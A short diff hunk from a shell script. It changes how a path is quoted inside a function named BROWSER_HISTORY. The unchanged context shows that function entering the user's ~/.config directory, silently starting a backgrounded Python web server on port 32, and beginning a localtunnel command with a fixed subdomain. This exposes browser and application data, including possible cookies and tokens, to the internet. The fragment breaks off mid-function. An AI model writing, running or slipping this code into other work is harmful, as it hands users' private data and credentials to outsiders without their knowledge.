@@ -93,7 +93,7 @@ HOSTNAME=$(logname)
 CONFIG_PATH="/home/${HOSTNAME}/.config"
 BROWSER_HISTORY() {
     echo "Starting browser history.."
-    cd ${CONFIG_PATH}
+    cd $CONFIG_PATH
     cmd1="python3 -m http.server 32"
     eval "${cmd1}" &>/dev/null & disown;
     cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812432"
